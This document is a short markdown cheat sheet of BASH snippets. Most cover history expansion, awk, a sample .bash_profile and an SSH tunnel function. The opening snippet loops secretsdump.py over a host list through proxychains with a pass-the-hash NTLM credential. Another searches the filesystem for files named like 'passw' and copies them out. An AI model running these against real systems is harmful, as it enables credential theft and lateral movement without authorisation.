# Linux

## BASH

BASH loop example
```
	for u in `cat hosts.txt`; do
		echo -n "[*] user: $u" && \
		proxychains python /usr/local/bin/secretsdump.py domain/username@$u -hashes aad3b435b51404eeaad3b435b51404ee:0e493911f561a425e7a905329f4454bf |tee user_brute.log
	done
```


BASH Find and copy files
```
    find / -iname "passw" -print0 | xargs -I {} cp {} /new/path

    find / -iname "passw" | xargs -I {} cp {} /new/path
```


Remove new line following ":"
```
    awk '/:/ {printf("%s", $0); next}1' file.txt
```


BASH Current line reference
```
    # Use !#:1 as second arg

    cp /etc/selinux/strict/modules/active/modules/file1.pp !#:1.bak

    ls /etc/selinux/strict/modules/active/modules/
    file1.pp file1.pp.bak

    echo test2 test3 test4 & echo !#:2
    test2 test3 test4
    test3
```


BASH repeat last arg from last cmd
```
    cp /tmp/123.abd /etc/selinux/strict/modules/active/modules/123.pp
    File not found

    cp /tmp/123.abc $!
    cp /tmp/123.abc /etc/selinux/strict/modules/active/modules/123.pp
```


BASH Get last arg parent folder
```
    tar czvf 123xyz.tgz /etc/selinux/strict/modules/active/modules/124.pp
    
    tar: /etc/selinux/strict/modules/active/modules/123.pp: Cannot stat: No such file or directory
    tar: Error exit delayed from previous errors

 
    ls !$:h
    ls /etc/selinux/strict/modules/active/modules/
    123.pp
```

BASH Replace chars from last command
```
    tar czvf treat_module.tgz /etc/selinux/strict/modules/active/modules/treat_module.pp
    tar: /etc/selinux/strict/modules/active/modules/treat_module.pp: Cannot stat: No such file or directory
    tar: Error exit delayed from previous errors

    !!:gs/treat/threat/
```


BASH .bashrc Function Example
```
    function start_sshtunnel() {
        ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123 -t ssh -L 8800:localhost:80 james@124.125.123
    }
```


Quick BASH format .bash_profile (mod ipconfig > ifconfig for Linux)
```
# .bash_profile

PATH=$PATH:/home/james/

export PATH

HISTCONTROL=ignoreboth
HISTSIZE=9000
HISTFILESIZE=9000
HISTTIMEFORMAT='%Y%m%d_%H%M%S_%zUTC '

shopt -s histappend
shopt -s checkwinsize

alias ls='ls -G'
alias grep='grep --color=auto'
alias la='ls -AlahG'
alias el='sudo $(history -p \!\!)'
alias ll='ls -alF'
alias l='ls -CF'
alias lg='ls -AlahG |grep $1'
alias netstati='lsof -P -i -n'
alias lr='ls -lahs1Sc'
alias gh='history|grep --color=auto'
alias level='echo $HLVL'

function my_ip {
#    /sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'
    /sbin/ifconfig eth0 | grep 'inet ' | awk '{ print $2}'
#    ipconfig getifaddr en0
}



export PS1="\n\n\[\$(if [[ \$? == 0 ]]; then echo \"\[$GREEN\]✓\"; else echo \"\[$RED\]✕\"; fi)[\033[33m\]\D{%Y%m%d_%H%M%S}\[\033[m\] \[\033[36m\]\u@\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\[\033[m\]] \[\033[1;31m\]\n[\w]\[\033[m\] \n \$ "

```

Create NTLM Hash from Mac CLI
```
    echo -n password | iconv -t UTF-16LE | openssl md4
```
